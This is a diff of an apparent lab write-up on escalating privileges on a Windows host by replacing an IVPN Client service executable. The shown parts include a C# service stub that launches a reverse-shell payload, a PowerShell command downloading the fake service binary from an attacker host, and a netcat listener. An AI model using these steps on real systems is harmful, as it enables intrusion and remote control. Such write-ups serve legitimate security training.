@@ -1637,8 +1637,8 @@ The service is running as local system account that is perfect to escalate our p
     The IVPN Client service is starting.
     The IVPN Client service was started successfully.
 
-Now we have to find a way to put a malicious exe into <b>C:\Program Files\IVPN Client folder</b>
-My VPN IP and Osiris IP are changed from now on. Contiuning to analyze the server I found a C:\script folder containing 2 files:
+Now we have to find a way to put a malicious exe into <b>C:\Program Files\IVPN Client folder.
+Note that my VPN IP and Osiris IP are changed from now on</b>. Contiuning to analyze the server I found a C:\script folder containing 2 files:
 
 	copyprofile.cmd                                                      
  	update.vbs   
@@ -1670,7 +1670,6 @@ Ok so we have all the requirements in order to perform our exploit. We only need
 	
         protected override void OnStart(string[] args)
         {
-           
 
             //here your payload
             string payL = @"c:\windows\temp\rs.exe";
@@ -1709,10 +1708,9 @@ The service on the start event will execute our reverse shell, before it will sl
 	     this.serviceInstaller1.DisplayName = this.serviceInstaller1.ServiceName;
 	...
 
-I also specified that the service must run as local system user.
+I also specified that the service must run as local system user. Once compiled we have to rename the exe as IVPN and transfered to C:\temp on Osirid
 
-
-Invoke-WebRequest http://10.9.0.223:8000/IVPN.exe -outfile c:\temp\IVPN.exe
+	PS C:\script> Invoke-WebRequest http://10.9.0.223:8000/IVPN.exe -outfile c:\temp\IVPN.exe
 
 
  	PS C:\script> cscript update.vbs
@@ -1734,7 +1732,7 @@ Invoke-WebRequest http://10.9.0.223:8000/IVPN.exe -outfile c:\temp\IVPN.exe
  	....
 
   The IVPN Client service is starting....^C
-                                                                                                                                                                                                                                            
+                                                                                                                                                     
 
 └─$ nc -lvp 1234
 listening on [any] 1234 ...
